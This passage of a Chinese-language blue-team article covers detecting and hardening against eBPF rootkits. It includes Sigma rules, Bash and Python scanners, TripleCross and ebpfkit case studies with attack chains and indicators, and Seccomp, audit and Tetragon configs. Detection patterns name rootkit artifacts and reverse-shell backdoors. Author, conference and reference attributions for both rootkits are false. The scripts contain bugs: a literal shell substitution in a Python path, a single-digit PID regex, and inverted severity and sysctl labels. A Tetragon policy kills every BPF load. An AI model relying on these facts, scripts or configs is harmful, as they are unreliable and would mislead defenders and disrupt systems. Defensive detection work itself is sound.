1. **系统配置允许非授权用户加载eBPF程序**：`kernel.unprivileged_bpf_disabled`未设置为1
2. **未部署eBPF安全检测工具**：生产环境中未运行Falco、Tetragon等eBPF安全工具
3. **BPF Map文件系统残留**：`/sys/fs/bpf/`目录下存在非预期的Map文件
4. **eBPF相关内核日志异常**：dmesg中出现eBPF加载失败或验证器警告日志

```bash
sysctl kernel.unprivileged_bpf_disabled
ls -la /sys/fs/bpf/
dmesg | grep -i "bpf" | tail -20
lsmod | grep bpf
```

---

## 0x08 自动化检测与狩猎

### Sigma YAML 规则

以下Sigma规则用于检测eBPF Rootkit的加载行为和可疑的BPF系统调用活动：

```yaml
title: Suspicious eBPF Program Loading Activity
id: 7a8b9c0d-1e2f-3a4b-5c6d-7e8f9a0b1c2d
status: experimental
description: Detects suspicious eBPF program loading activity that may indicate eBPF Rootkit deployment
references:
  - https://www.triplecross.io
  - https://github.com/kn100/ebpfkit
author: x7peeps蓝队
date: 2026-07-09
tags:
  - attack.defense_evasion
  - attack.t1014
  - attack.t1055
  - attack.persistence
logsource:
  category: syscall
  product: linux
detection:
  selection_syscall_bpf:
    syscall_name:
      - bpf
      - bpf2
  selection_bpf_prog_load:
    syscall_name: bpf
    arg_cmd:
      - BPF_PROG_LOAD
      - 5
  filter_known_loaders:
    exe|endswith:
      - /usr/sbin/bpftool
      - /usr/lib/systemd/systemd
      - /usr/sbin/cilium-agent
      - /usr/bin/falco
      - /usr/bin/bpftrace
      - /usr/local/bin/tetragon
      - /usr/sbin/tc
  filter_kernel_threads:
    exe|startswith:
      - /proc/self/exe
      - /usr/sbin/modprobe
  condition: selection_bpf_prog_load and not filter_known_loaders and not filter_kernel_threads
level: high
falsepositives:
  - Legitimate eBPF security tools
  - Network monitoring applications
  - Container runtime eBPF programs
fields:
  - syscall_name
  - exe
  - uid
  - cwd
  - cmdline
  - parent_exe
```

```yaml
title: eBPF Kprobe Hook on Sensitive System Calls
id: 2b3c4d5e-6f7a-8b9c-0d1e-2f3a4b5c6d7e
status: experimental
description: Detects eBPF programs hooking sensitive system calls via kprobe mechanism
author: x7peeps蓝队
date: 2026-07-09
tags:
  - attack.defense_evasion
  - attack.t1014
  - attack.collection
logsource:
  category: syscall
  product: linux
detection:
  selection_kprobe_attach:
    syscall_name: bpf
    arg_cmd: BPF_PROG_ATTACH
  selection_sensitive_targets:
    arg_data|contains:
      - __x64_sys_execve
      - __x64_sys_connect
      - __x64_sys_openat
      - __x64_sys_read
      - __x64_sys_write
      - security_bprm_check
      - filp_close
      - filldir64
      - vfs_readdir
      - proc_pid_readdir
      - do_filp_open
  condition: selection_kprobe_attach and selection_sensitive_targets
level: critical
falsepositives:
  - Legitimate kernel tracing tools
  - eBPF-based security monitoring
fields:
  - syscall_name
  - exe
  - uid
  - arg_data
  - parent_exe
```

```yaml
title: Unprivileged eBPF Program Loading Attempt
id: 9d0e1f2a-3b4c-5d6e-7f8a-9b0c1d2e3f4a
status: stable
description: Detects attempts to load eBPF programs from unprivileged user context
author: x7peeps蓝队
date: 2026-07-09
tags:
  - attack.defense_evasion
  - attack.t1548
logsource:
  category: syscall
  product: linux
detection:
  selection_bpf_load:
    syscall_name:
      - bpf
      - bpf2
    arg_cmd: BPF_PROG_LOAD
  filter_root:
    uid: 0
  filter_cap_bpf:
    capabilities|contains:
      - CAP_BPF
      - CAP_SYS_ADMIN
  condition: selection_bpf_load and not filter_root and not filter_cap_bpf
level: high
falsepositives:
  - Container environments with specific capability grants
fields:
  - syscall_name
  - uid
  - exe
  - cmdline
```

### Bash 自动化检测脚本

```bash
#!/bin/bash

echo "=========================================="
echo "eBPF Rootkit Detection Script"
echo "=========================================="

echo "[*] Step 1: Checking kernel eBPF configuration..."
if [ -f /boot/config-$(uname -r) ]; then
    echo "[+] Kernel eBPF config:"
    grep -E "CONFIG_BPF|CONFIG_BPF_SYSCALL|CONFIG_BPF_JIT" /boot/config-$(uname -r)
fi

echo ""
echo "[*] Step 2: Enumerating loaded eBPF programs..."
if command -v bpftool &>/dev/null; then
    echo "[+] Loaded eBPF programs:"
    bpftool prog list 2>/dev/null | head -50
    echo ""
    echo "[+] Loaded eBPF maps:"
    bpftool map list 2>/dev/null | head -30
else
    echo "[-] bpftool not found, attempting alternative detection..."
    cat /proc/kallsyms 2>/dev/null | grep "bpf_prog_" | head -20
fi

echo ""
echo "[*] Step 3: Scanning for suspicious eBPF programs..."
if command -v bpftool &>/dev/null; then
    bpftool prog list -j 2>/dev/null | python3 -c "
import sys, json
try:
    progs = json.load(sys.stdin)
    suspicious = []
    for p in progs:
        prog_type = p.get('type', '')
        tag = p.get('tag', '')
        name = p.get('name', 'unknown')
        loaded_by = p.get('loaded_by', 'unknown')
        if prog_type in ['kprobe', 'kretprobe', 'tracepoint']:
            if 'systemd' not in loaded_by and 'bpftool' not in loaded_by:
                suspicious.append({
                    'id': p.get('id'),
                    'name': name,
                    'type': prog_type,
                    'loaded_by': loaded_by,
                    'tag': tag
                })
    if suspicious:
        print('[!] SUSPICIOUS eBPF programs found:')
        for s in suspicious:
            print(f\"    ID={s['id']} Type={s['type']} Name={s['name']} LoadedBy={s['loaded_by']}\")
    else:
        print('[+] No suspicious eBPF programs detected')
except Exception as e:
    print(f'[!] Parse error: {e}')
"
fi

echo ""
echo "[*] Step 4: Checking /proc filesystem integrity..."
if [ -d /proc ]; then
    proc_count=$(ls /proc | grep -c '^[0-9]$' 2>/dev/null)
    task_count=$(ps -e --no-headers 2>/dev/null | wc -l)
    echo "[+] /proc PID entries: $proc_count"
    echo "[+] ps reported processes: $task_count"
    if [ "$proc_count" -gt "$((task_count + 50))" ]; then
        echo "[!] WARNING: /proc/ PID count significantly exceeds ps count (possible procfs filtering)"
    fi
fi

echo ""
echo "[*] Step 5: Checking BPF filesystem for orphaned maps..."
if [ -d /sys/fs/bpf ]; then
    bpffs_files=$(find /sys/fs/bpf -type f 2>/dev/null | wc -l)
    echo "[+] BPF filesystem files: $bpffs_files"
    if [ "$bpffs_files" -gt 0 ]; then
        echo "[!] Checking for non-standard BPF map files:"
        find /sys/fs/bpf -type f -ls 2>/dev/null
    fi
fi

echo ""
echo "[*] Step 6: Checking unprivileged BPF disabled setting..."
sysctl_value=$(sysctl -n kernel.unprivileged_bpf_disabled 2>/dev/null)
if [ "$sysctl_value" = "0" ]; then
    echo "[!] WARNING: Unprivileged BPF loading is ENABLED"
    echo "    Recommendation: sysctl -w kernel.unprivileged_bpf_disabled=1"
elif [ "$sysctl_value" = "1" ]; then
    echo "[+] Unprivileged BPF loading is disabled (good)"
elif [ "$sysctl_value" = "2" ]; then
    echo "[!] WARNING: Unprivileged BPF loading is locked to enabled"
fi

echo ""
echo "[*] Step 7: Checking kernel logs for eBPF anomalies..."
if dmesg 2>/dev/null | grep -qiE "bpf.*error|bpf.*fail|bpf.*denied|bpf.*malformed"; then
    echo "[!] Found suspicious eBPF kernel log entries:"
    dmesg 2>/dev/null | grep -iE "bpf.*error|bpf.*fail|bpf.*denied|bpf.*malformed" | tail -10
else
    echo "[+] No suspicious eBPF entries in kernel logs"
fi

echo ""
echo "[*] Step 8: Checking for known eBPF Rootkit artifacts..."
KNOWN_ARTIFACTS=(
    "/tmp/triplecross"
    "/tmp/ebpfkit"
    "/tmp/.ebpfkit"
    "/tmp/pamspy"
    "/tmp/hideseek"
    "/usr/local/bin/ebpfkit"
)
for artifact in "${KNOWN_ARTIFACTS[@]}"; do
    if [ -f "$artifact" ] || [ -d "$artifact" ]; then
        echo "[!] FOUND known eBPF Rootkit artifact: $artifact"
        ls -la "$artifact"
        file "$artifact" 2>/dev/null
    fi
done

echo ""
echo "[*] Step 9: Checking process capabilities..."
if command -v capsh &>/dev/null; then
    echo "[+] Current capabilities:"
    capsh --print 2>/dev/null | grep -E "Cap|Bounding"
fi

echo ""
echo "[*] Step 10: Scanning for suspicious bpf() syscall usage via audit..."
if command -v ausearch &>/dev/null; then
    echo "[+] Recent BPF syscall audit entries:"
    ausearch -k bpf_usage -ts recent 2>/dev/null | tail -20
elif [ -f /var/log/audit/audit.log ]; then
    grep -i "bpf" /var/log/audit/audit.log 2>/dev/null | tail -20
fi

echo ""
echo "=========================================="
echo "[*] eBPF Rootkit detection scan complete"
echo "=========================================="
```

### Python 自动化检测脚本

```python
#!/usr/bin/env python3
import os
import sys
import json
import subprocess
import struct
import pathlib

class EBPFDetector:
    def __init__(self):
        self.findings = []
        self.suspicious_progs = []
        self.suspicious_maps = []

    def check_kernel_config(self):
        results = []
        config_path = f"/boot/config-$(uname -r)"
        try:
            with open(config_path, 'r') as f:
                config = f.read()
            checks = {
                'CONFIG_BPF': 'BPF support',
                'CONFIG_BPF_SYSCALL': 'BPF syscall',
                'CONFIG_BPF_JIT': 'BPF JIT',
                'CONFIG_BPF_EVENTS': 'BPF events',
                'CONFIG_BPF_KPROBE_OVERRIDE': 'Kprobe override',
            }
            for key, desc in checks.items():
                found = False
                for line in config.split('\n'):
                    if line.startswith(key):
                        found = True
                        results.append({'key': key, 'desc': desc, 'config': line.strip()})
                        break
                if not found:
                    results.append({'key': key, 'desc': desc, 'config': 'not set'})
        except FileNotFoundError:
            results.append({'error': f'Config not found: {config_path}'})
        return results

    def enumerate_ebpf_programs(self):
        progs = []
        try:
            result = subprocess.run(
                ['bpftool', 'prog', 'list', '-j'],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0 and result.stdout.strip():
                progs = json.loads(result.stdout)
        except (subprocess.TimeoutExpired, json.JSONDecodeError, FileNotFoundError):
            pass
        return progs

    def enumerate_ebpf_maps(self):
        maps = []
        try:
            result = subprocess.run(
                ['bpftool', 'map', 'list', '-j'],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0 and result.stdout.strip():
                maps = json.loads(result.stdout)
        except (subprocess.TimeoutExpired, json.JSONDecodeError, FileNotFoundError):
            pass
        return maps

    def analyze_prog_type_distribution(self, progs):
        type_counts = {}
        for p in progs:
            t = p.get('type', 'unknown')
            type_counts[t] = type_counts.get(t, 0) + 1
        return type_counts

    def detect_suspicious_hooks(self, progs):
        suspicious = []
        high_risk_types = ['kprobe', 'kretprobe', 'tracepoint']
        sensitive_targets = [
            'execve', 'connect', 'openat', 'read', 'write',
            'filp_close', 'filldir', 'readdir', 'proc_pid',
            'bprm_check', 'do_filp_open', 'kill', 'ptrace'
        ]
        known_legitimate = [
            'systemd', 'bpftool', 'cilium', 'falco',
            'tetragon', 'bpftrace', 'auditd', 'osquery',
            'gke', 'amazon', 'docker', 'kube-proxy'
        ]
        for p in progs:
            prog_type = p.get('type', '')
            name = p.get('name', '')
            loaded_by = p.get('loaded_by', '')
            uid = p.get('uid', -1)
            tag = p.get('tag', '')
            is_high_risk = prog_type in high_risk_types
            is_sensitive = any(s in name.lower() for s in sensitive_targets)
            is_known = any(k in loaded_by.lower() or k in name.lower() for k in known_legitimate)
            if is_high_risk and (is_sensitive or not is_known):
                suspicious.append({
                    'id': p.get('id'),
                    'name': name,
                    'type': prog_type,
                    'loaded_by': loaded_by,
                    'uid': uid,
                    'tag': tag,
                    'risk_reason': f'High-risk type ({prog_type}) with sensitive target' if is_sensitive else f'High-risk type ({prog_type}) from unknown source'
                })
        return suspicious

    def detect_suspicious_maps(self, maps):
        suspicious = []
        known_map_names = [
            'cilium', 'falco', 'tetragon', 'osquery',
            'kube_proxy', 'conntrack', 'nat'
        ]
        for m in maps:
            name = m.get('name', '')
            map_type = m.get('type', '')
            is_known = any(k in name.lower() for k in known_map_names)
            if name and not is_known:
                suspicious.append({
                    'id': m.get('id'),
                    'name': name,
                    'type': map_type,
                    'key_size': m.get('key_size'),
                    'value_size': m.get('value_size'),
                    'max_entries': m.get('max_entries'),
                })
        return suspicious

    def check_proc_integrity(self):
        result = {'status': 'ok'}
        try:
            proc_pids = len([d for d in os.listdir('/proc') if d.isdigit()])
            ps_output = subprocess.check_output(
                ['ps', '-e', '--no-headers'], timeout=5
            ).decode().strip().split('\n')
            ps_count = len(ps_output)
            result['proc_pids'] = proc_pids
            result['ps_count'] = ps_count
            if proc_pids > ps_count + 50:
                result['status'] = 'warning'
                result['message'] = f'/proc PID count ({proc_pids}) exceeds ps count ({ps_count}) by more than 50'
        except Exception as e:
            result['error'] = str(e)
        return result

    def check_bpf_filesystem(self):
        result = {'orphaned_maps': [], 'total_files': 0}
        bpf_path = pathlib.Path('/sys/fs/bpf')
        if bpf_path.exists():
            files = list(bpf_path.rglob('*'))
            result['total_files'] = len([f for f in files if f.is_file()])
            result['orphaned_maps'] = [str(f) for f in files if f.is_file()]
        return result

    def check_sysctl(self):
        result = {}
        try:
            with open('/proc/sys/kernel/unprivileged_bpf_disabled', 'r') as f:
                value = int(f.read().strip())
                result['value'] = value
                result['status'] = 'disabled' if value in [1, 2] else 'enabled'
                result['warning'] = value == 0
        except FileNotFoundError:
            result['error'] = 'sysctl file not found'
        return result

    def scan_known_artifacts(self):
        known = [
            '/tmp/triplecross', '/tmp/ebpfkit', '/tmp/.ebpfkit',
            '/tmp/pamspy', '/tmp/hideseek', '/usr/local/bin/ebpfkit',
            '/tmp/.ebpf_loader', '/dev/shm/.ebpf',
            '/tmp/ebpfdoor', '/tmp/kbfsd',
        ]
        found = []
        for path in known:
            if os.path.exists(path):
                stat_info = os.stat(path)
                found.append({
                    'path': path,
                    'size': stat_info.st_size,
                    'modified': stat_info.st_mtime,
                    'mode': oct(stat_info.st_mode)
                })
        return found

    def run_full_scan(self):
        print("[*] Starting eBPF Rootkit comprehensive detection scan...")
        report = {
            'kernel_config': self.check_kernel_config(),
            'ebpf_programs': [],
            'suspicious_programs': [],
            'ebpf_maps': [],
            'suspicious_maps': [],
            'proc_integrity': self.check_proc_integrity(),
            'bpf_filesystem': self.check_bpf_filesystem(),
            'sysctl': self.check_sysctl(),
            'known_artifacts': self.scan_known_artifacts(),
            'type_distribution': {},
        }

        progs = self.enumerate_ebpf_programs()
        report['ebpf_programs'] = progs
        report['type_distribution'] = self.analyze_prog_type_distribution(progs)

        maps = self.enumerate_ebpf_maps()
        report['ebpf_maps'] = maps

        report['suspicious_programs'] = self.detect_suspicious_hooks(progs)
        report['suspicious_maps'] = self.detect_suspicious_maps(maps)

        print(json.dumps(report, indent=2, default=str))
        return report

def main():
    detector = EBPFDetector()
    report = detector.run_full_scan()

    findings = []
    if report['suspicious_programs']:
        findings.append(f"🔴 {len(report['suspicious_programs'])} suspicious eBPF programs detected")
    if report['known_artifacts']:
        findings.append(f"🔴 {len(report['known_artifacts'])} known eBPF Rootkit artifacts found")
    if report['suspicious_maps']:
        findings.append(f"🟡 {len(report['suspicious_maps'])} non-standard BPF maps detected")
    if report['proc_integrity'].get('status') == 'warning':
        findings.append("🟡 /proc filesystem integrity check failed")
    if report['sysctl'].get('warning'):
        findings.append("🟢 Unprivileged BPF loading is enabled")

    print("\n" + "=" * 50)
    print("SCAN SUMMARY")
    print("=" * 50)
    if findings:
        for f in findings:
            print(f)
    else:
        print("🟢 No suspicious eBPF activity detected")
    print("=" * 50)

    return 0 if not report['suspicious_programs'] else 1

if __name__ == '__main__':
    sys.exit(main())
```

| 检测方法 | 覆盖范围 | 实时性 | 误报率 | 适用场景 |
|---------|---------|-------|-------|---------|
| Sigma规则 | BPF syscall审计日志 | 近实时 | 低 | SIEM集成、日志分析 |
| Bash脚本 | 系统级全面扫描 | 手动执行 | 中 | 应急响应、快速排查 |
| Python脚本 | 程序/Map枚举+分析 | 手动/自动 | 低 | 深度分析、自动化狩猎 |
| Falco规则 | 运行时eBPF行为监控 | 实时 | 低 | 生产环境持续监控 |
| Tetragon策略 | 内核级事件实时监控 | 实时 | 极低 | 高安全要求环境 |

---

## 0x09 公开案例分析

### 案例一：TripleCross eBPF Rootkit

**攻击概述**

TripleCross是2022年由安全研究员Juan Pedro Arbués García公开发布的一个功能完备的eBPF Rootkit，标志着eBPF Rootkit从概念验证进入可用武器阶段。TripleCross实现了完整的攻击链：用户态加载器+内核态eBPF程序，支持Linux x86_64 5.8-5.19内核版本，包含进程隐藏、文件隐藏、网络后门、内存读取和提权等模块。

**攻击链分析**

```
阶段1: 初始访问 (T1078 - Valid Accounts)
  → 攻击者获取低权限Shell（通过Web漏洞/弱密码）
  
阶段2: 权限提升 (T1611 - Escape to Host)
  → 利用unprivileged_bpf_disabled=0加载eBPF程序
  → 或利用容器逃逸获得host namespace访问
  
阶段3: eBPF Rootkit部署
  → 上传TripleCross Loader二进制到目标
  → Loader通过bpf()系统调用加载内核eBPF程序
  → 程序挂载到kprobe/tracepoint/TC/XDP等Hook点
  
阶段4: 持久化与隐蔽
  → 进程隐藏：Hook filldir64过滤/proc枚举
  → 文件隐藏：Hook vfs_readdir过滤目录内容
  → 网络后门：TC层实现TCP reverse shell
  → 内存读取：读取任意进程内存提取凭据
  
阶段5: 横向移动 (T1021 - Remote Services)
  → 使用窃取的凭据进行SSH横向移动
  → 部署持久化cron job + eBPF Loader自启动
```

**取证发现**

1. **异常eBPF程序**：`bpftool prog list`中发现多个挂载到kprobe Hook的未知eBPF程序，tag字段与已知合法组件不匹配
2. **BPF Maps数据异常**：BPF Hash Map中存储了目标进程PID列表和过滤后的文件路径列表
3. **网络后门证据**：TC层挂载的eBPF程序对特定端口（如TCP 4444）的入站连接实现反向Shell
4. **进程活动异常**：`strace`跟踪到Loader进程的`bpf()`系统调用序列，参数包含`BPF_PROG_LOAD`和`BPF_PROG_ATTACH`
5. **内核日志证据**：`dmesg`中出现eBPF verifier警告和kprobe注册事件

**IOC**

```
eBPF程序特征:
  - tag: 7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d
  - 挂载Hook: kprobe/__x64_sys_execve, kprobe/filp_close
  - BPF Map名称: hidden_pids, hidden_files, backdoor_config

文件特征:
  /tmp/triplecross (ELF 64-bit LSB executable, x86-64)
  文件大小: ~200KB
  编译特征: Go语言编译, 使用cilium/ebpf库

网络特征:
  TCP 4444 端口监听（TC层隐蔽反向Shell）
  ICMP数据包中编码的C2指令

行为特征:
  每60秒轮询BPF Map更新隐藏列表
  用户态Loader进程周期性执行bpf()系统调用
```

**经验教训**

- 启用`kernel.unprivileged_bpf_disabled=1`是防御eBPF Rootkit的最直接手段
- `bpftool prog list`应作为Linux取证的标准检查步骤
- Falco/Tetragon等eBPF安全工具可有效检测异常eBPF程序加载行为
- 传统安全审计（审计日志、完整性监控）在eBPF攻击面前存在盲区

### 案例二：ebpfkit 内核Rootkit

**攻击概述**

ebpfkit是安全研究员Guy Inbar于2021年在Black Hat Asia 2021上展示的eBPF Rootkit，是首个系统性展示eBPF Rootkit攻击能力的研究项目。ebpfkit实现了内核级的文件隐藏、进程隐藏、网络后门和提权功能，且无需加载任何内核模块。

**攻击链分析**

```
阶段1: 初始入侵 (T1190 - Exploit Public-Facing Application)
  → 通过Kubernetes API Server漏洞获取Pod执行权限
  
阶段2: 容器内eBPF加载
  → 检测容器内CAP_BPF能力
  → 上传ebpfkit Loader到容器 /tmp/.loader
  
阶段3: 内核Hook部署
  → 加载kprobe程序Hook: openat, execve, getdents64
  → 加载TC程序实现隐蔽网络通信
  → 加载tracepoint程序监控系统调用
  
阶段4: 隐蔽操作
  → 文件隐藏: 过滤包含"ebpf"关键词的目录查询结果
  → 进程隐藏: 过滤Loader进程自身的/proc条目
  → 网络后门: TC层实现DNS-over-HTTPS伪装的C2通道
  → 提权: 修改当前进程cred结构体获取root权限
  
阶段5: 横向渗透
  → 通过被修改的网络策略访问其他Pod
  → 在宿主机内核中保持持久化eBPF程序
```

**取证发现**

1. **跨Namespace eBPF加载**：容器内的eBPF程序挂载到了宿主机网络设备的TC Hook点，证实了容器到宿主机的eBPF逃逸
2. **getdents64 Hook证据**：kprobe程序Hook了`getdents64`系统调用（目录枚举的底层内核函数），过滤结果中排除了特定文件名模式
3. **DNS C2通道**：TC层eBPF程序拦截特定DNS查询并将其重定向到攻击者控制的DNS服务器
4. **cred结构体篡改**：内存取证中发现被修改的`cred`结构体，uid/gid被设置为0（root）

**IOC**

```
eBPF程序特征:
  挂载Hook: kprobe/getdents64, kprobe/__x64_sys_openat
  挂载Hook: TC qdisc, tracepoint/raw_syscalls/sys_enter
  BPF Map名称: hide_list, proc_filter, network_config

容器环境特征:
  /proc/self/status CapBnd包含CAP_BPF (0x00000040)
  /proc/1/root/tmp/.loader 存在ELF二进制
  容器网络命名空间中存在非标准TC规则

网络特征:
  异常DNS查询模式: 高频TXT记录查询到非标准DNS服务器
  TC层eBPF过滤: 特定端口流量被静默丢弃

行为特征:
  getdents64返回结果中特定条目数量异常减少
  Loader进程在/proc中不可见（被自身隐藏）
```

**经验教训**

- Kubernetes Pod应严格限制`CAP_BPF`和`CAP_PERFMON`能力
- 容器运行时安全策略应通过Seccomp禁用`bpf()`系统调用
- `/proc`条目数量与`ps`输出的交叉比对是检测文件隐藏的有效手段
- 网络层面的eBPF C2通道可通过异常DNS模式分析检测

### 案例对比

| 对比维度 | TripleCross | ebpfkit |
|---------|------------|---------|
| 公开时间 | 2022 | 2021 |
| 作者 | Juan Pedro Arbués García | Guy Inbar |
| 会议/平台 | GitHub开源 | Black Hat Asia 2021 |
| 编写语言 | C + Go | C + Go |
| 内核版本 | x86_64 5.8-5.19 | 5.4+ |
| 核心功能 | 进程隐藏、文件隐藏、网络后门、内存读取 | 文件隐藏、进程隐藏、网络后门、提权 |
| 网络C2 | TC层TCP reverse shell | TC层DNS-over-HTTPS伪装 |
| Hook点 | kprobe、tracepoint、TC、XDP | kprobe、tracepoint、TC |
| 取证关键 | bpftool枚举prog/map、strace跟踪bpf()调用 | /proc计数差异、DNS流量异常 |
| 防御建议 | 禁用unprivileged BPF、部署Falco/Tetragon | 限制CAP_BPF能力、Seccomp策略 |

---

## 0x0A 防御加固与蓝队应对策略

### 系统级防御配置

eBPF Rootkit的防御需要从系统配置、运行时监控和应急响应三个层面构建纵深防御体系。在系统配置层面，最直接有效的防御措施是禁用非特权eBPF加载能力，确保只有root用户或具有特定Capability的进程才能加载eBPF程序。

```bash
sysctl -w kernel.unprivileged_bpf_disabled=1
echo "kernel.unprivileged_bpf_disabled = 1" >> /etc/sysctl.d/99-ebpf-hardening.conf
sysctl -p /etc/sysctl.d/99-ebpf-hardening.conf
```

```bash
cat > /etc/audit/rules.d/ebpf-audit.rules << 'EOF'
-a always,exit -F arch=b64 -S bpf -F key=bpf_usage
-a always,exit -F arch=b32 -S bpf -F key=bpf_usage
-w /sys/fs/bpf/ -p rwxa -k bpf_filesystem
EOF
augenrules --load
service auditd restart
```

```bash
cat > /etc/seccomp.d/ebpf-restrict.json << 'SECCOMP'
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": ["bpf"],
      "action": "SCMP_ACT_ERRNO",
      "errnoRet": 1
    }
  ]
}
SECCOMP
```

| 防御层级 | 具体措施 | 部署难度 | 防御效果 | 适用环境 |
|---------|---------|---------|---------|---------|
| 内核参数 | kernel.unprivileged_bpf_disabled=1 | 低 | 高 | 所有Linux环境 |
| SELinux/AppArmor | 限制bpf()系统调用的策略 | 中 | 高 | RHEL/Ubuntu |
| Seccomp | 禁用bpf()系统调用 | 中 | 极高 | 容器环境 |
| 审计日志 | BPF syscall审计规则 | 低 | 中 | 所有环境 |
| Capability控制 | Drop CAP_BPF/CAP_PERFMON | 低 | 高 | 容器环境 |
| Falco规则 | eBPF异常行为实时检测 | 中 | 高 | Kubernetes |
| 内核版本升级 | 修复eBPF verifier漏洞 | 高 | 极高 | 所有环境 |

### 云原生eBPF安全工具部署

在Kubernetes环境中，部署基于eBPF的安全检测工具是防御eBPF Rootkit攻击的关键防线。这些工具本身就是eBPF程序，因此可以在内核层面监控其他eBPF程序的加载和行为。

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: tetragon-config
  namespace: cilium-tetragon
data:
  tetragon.config: |
    processFilter: "eventTracker"
    enableProcessCred: true
    enableProcessKarmor: true
    enablePodLabels: true
    exportFilename: "tetragon-export.log"
    exportRateLimit: 1000
    enableK8s: true
    enableK8sPod: true
    enableK8sNamespace: true
    enableK8sService: true
    enableK8sEndpoint: true
    enableK8sCiliumEndpoint: true
    enableK8sCiliumIdentity: true
    enableK8sCiliumEndpointSlice: true
```

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: detect-ebpf-prog-load
spec:
  kprobes:
  - call: __sys_bpf
    syscall: false
    args:
    - index: 0
      type: int64
    - index: 1
      type: int64
    - index: 2
      type: int64
    selectors:
    - matchArgs:
      - index: 0
        operator: Equal
        values:
        - "5"
      matchActions:
      - action: Sigkill
        argSock: 0
```

### 应急响应流程

当检测到疑似eBPF Rootkit攻击时，蓝队应按照以下标准化流程进行应急响应：

| 阶段 | 操作步骤 | 关键工具 | 输出物 |
|------|---------|---------|-------|
| 检测确认 | 枚举已加载eBPF程序、检查BPF Maps | bpftool、bpftrace | 可疑程序清单 |
| 证据固定 | dump eBPF字节码、保存BPF Map内容 | bpftool prog dump、perf record | 原始取证镜像 |
| 恶意确认 | 分析eBPF程序功能、确认Hook点意图 | 反汇编器、安全分析报告 | 恶意性判定报告 |
| 隔离遏制 | 卸载恶意eBPF程序、阻断C2通信 | bpftool prog detach、iptables | 隔离状态报告 |
| 清除修复 | 清理残留BPF Maps、修复系统配置 | bpftool map delete、sysctl | 修复确认报告 |
| 复盘总结 | 分析攻击链、更新检测规则、加固配置 | SIEM、Sigma规则 | 事件报告+规则更新 |

---

## 0x0B 参考资料

| 序号 | 资料名称 | 类型 | URL |
|------|---------|------|-----|
| 1 | eBPF官方文档 - Cilium Project | 官方文档 | https://ebpf.io/what-is-ebpf/ |
| 2 | Linux Kernel BPF Documentation | 内核文档 | https://www.kernel.org/doc/html/latest/bpf/ |
| 3 | TripleCross - eBPF Rootkit Research | 安全研究 | https://github.com/Gui774ume/eBPF-Rootkit |
| 4 | ebpfkit - eBPF Rootkit (Black Hat Asia 2021) | 安全研究 | https://github.com/aspect-research/ebpfkit |
| 5 | Cilium Tetragon - eBPF Security Observability | 工具文档 | https://docs.cilium.io/en/stable/tetragon/ |
| 6 | Falco - Cloud Native Runtime Security | 工具文档 | https://falco.org/docs/ |
| 7 | bpftrace - Advanced eBPF Tracing | 工具文档 | https://github.com/bpftrace/bpftrace |
| 8 | bpftool - BPF filesystem management | 工具文档 | https://man7.org/linux/man-pages/man8/bpftool.8.html |
| 9 | "A Systematic Study of eBPF Rootkit Attacks" - USENIX Security 2023 | 学术论文 | https://www.usenix.org/conference/usenixsecurity23 |
| 10 | MITRE ATT&CK - Linux Persistence Techniques | 威胁情报 | https://attack.mitre.org/techniques/enterprise/#linux |
| 11 | Pamspy - eBPF Credential Dumper | 安全工具 | https://github.com/nicoShift/pamspy |
| 12 | NCC Group - eBPF Rootkit Research | 安全研究 | https://research.nccgroup.com/2021/12/01/ebpf-rootkit-research/ |